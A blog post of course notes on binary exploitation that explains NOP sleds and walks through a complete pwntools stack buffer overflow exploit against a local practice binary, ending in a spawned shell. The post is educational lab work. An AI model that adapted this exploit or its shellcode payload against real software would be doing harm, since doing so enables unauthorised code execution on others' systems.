This is part III of my notes while working through [TsarSec's Course](https://taggartinstitute.org/courses/an-oral-history-of-binary-exploitation-defenses) on [binary-exploitation](https://github.com/TrshPuppy/obsidian-notes/blob/main/cybersecurity/TTPs/exploitation/binary-exploitation/buffer-overflow.md). You can find part II [here](https://trshpuppy.github.io/portfolio/writeups/basic-buffer-overflow).

# B&E III: NOP Sleds

If you were following along in the last two parts, you would have noticed that the addresses I was referencing are different than the ones you may be seeing.

The difference in addresses on different systems is due mainly to _the environment variables stored by the stack._ If you were to add an environment variable in your system and then re-compile the binary, the addresses would be different.

Even the `$PWD` variable for the current working directory will effect the addresses if you were to run the binary from a different directory.

Because of this _our exploit code is not likely to work on a different target system_ because we don't know the exact address our shellcode will be at (even if we place it at the beginning of our injection like last time).

However, _the offsets will be the same_. That's because, as long as the code for the vulnerable program is the same, it compiles into the same binary. So, the length in memory between the `name` variable and the saved RIP on the stack is still 280 bytes.

So, since we can't control for the exact address where our malicious code will end up, we're going to move our shellcode to the end of the injection and 'slide' into it from the saved RIP using NOPs.

## NOP Sleds

In our basic overflow ([part 2](https://trshpuppy.github.io/portfolio/writeups/basic-buffer-overflow) of this series), we overwrote the saved RIP with the exact address of our shellcode (which was placed at the beginning of our injection payload).
<br>
<br>
![](/md-images/Pasted%20image%2020231121173335.png)
<br>
<br>
This time, we're still overwriting the saved RIP, but the address we place in there will be a guess. We're going to put an address which, according to our _best guess_ is an address within our NOP sled, which is the next part of the injection payload.

### What is a NOP?

'NOP' stands for 'non operational' or 'no operation' and refers to computer instructions in machine language which do nothing. The point of a NOP in assembly is to _not change the state of the program_ (although they often take a specific number of clock cycles to execute).

In our architecture, we'll be using the literal `nop operation` which is `b'\x90'`.

### Why NOP?

Because we can't reliably pick an address for our shellcode on the stack we're going to use NOPs in our payload as _executable filler_. Between the end of our 280 `chars` and our exploit code, we'll add a long sequence of NOPs. Then, we'll guess an address that's likely to be in our NOP sled (`0x7fffffffe000`), and overwrite the saved RIP with that address.

This will essentially widen the window of addresses which will capture the CPU for execution. If the address we overwrite the saved RIP with is within the NOP sled, the CPU will enter the sled at that address, begin executing the NOPs and _slide into our shellcode_ placed at the end of the NOP sequence. That's why this technique is called a _NOP sled_.

Using this technique, our payload on the stack will look something like this:
<br>
<br>
As a string:
![](/md-images/Pasted%20image%2020231214121607.png)
<br>
On the stack:
![](/md-images/Pasted%20image%2020231124142229.png)
<br>
<br>
Compared to our basic overflow (the first image) the shellcode is at the _END_ of the NOP sled instead of at the beginning of our payload (at the `name` variable). If we point the CPU to any of the addresses between the saved RIP and the shellcode, our shellcode is guaranteed to get executed.

### NOP Sled Length

We want our NOP sled to be pretty long so we can _increase the likelihood_ that our guessed address will be within the addresses the sled spans. This greatly increases our chance of capturing the CPU's execution flow, even in systems we haven't tested on.

## Re-Writing our Exploit

Our exploit code will now look like this:

```python
#!/usr/bin/env python3
from pwn import *

# we overflow saved rip after 280 or 0x118 bytes
overflow_offset_rip = 0x118

# we point saved rip to the stack hoping to hit our NOPSLED
new_rip = 0x7fffffffe000

# construct shellcode
# let pwntools know we're dealing with a 64-bit target
context.update(arch="amd64")

# assemble shellcode
shellcode = asm(shellcraft.amd64.linux.sh())

NOP_SLED = b"\x90" * 2048

# construct payload
payload = b"A" * overflow_offset_rip
payload += p64(new_rip)
payload += NOP_SLED
payload += shellcode

# connect to the vulnerable program p = process("./vuln_1")
p = process("./vuln_1")

# send the payload
p.sendafter(b"Hey, whats your name!?\n", payload)
p.sendafter(b"is this name correct? (y/n)?\n", b"y\n")

p.interactive()
```

Compared to our basic overflow code:

1. The `new_rip` is set to the address we're guessing is within the NOP sled.
2. The character filler portion of the shellcode isn't subtracted from to make room for the `shelcode` (since it will be at the end this time).
3. The `NOP_SLED` variable is new and consists of 2048 `nop` operations (`b'\x90'`).
4. The `shellcode` is added to the end of the payload and not the beginning.

## NOP Slide into the Main Frame!

```bash
┌──(hakcypuppy㉿kali)-[~/tsar]

└─$ ./exploit.py
[+] Starting local process './vuln_1': pid 1284173
[*] Switching to interactive mode
$ whoami
hakcypuppy
$
```

_Noice!_

In the next part of this series, we'll make our exploit _even more reliable_ by using ROP Gadgets!

> Resources
>
> -   [Wikipedia: Buffer Overflows](https://en.wikipedia.org/wiki/Stack_buffer_overflow)
> -   [TsarSec: Oral History of Binary Exploitation](https://taggartinstitute.org/courses/an-oral-history-of-binary-exploitation-defenses)
> -   [Wikipedia: NOP](<https://en.wikipedia.org/wiki/NOP_(code)>)
> -   [Wikipedia: NOP Slide](https://en.wikipedia.org/wiki/NOP_slide)

> My previous notes:
>
> -   You'll find them all [here](https://github.com/TrshPuppy/obsidian-notes)
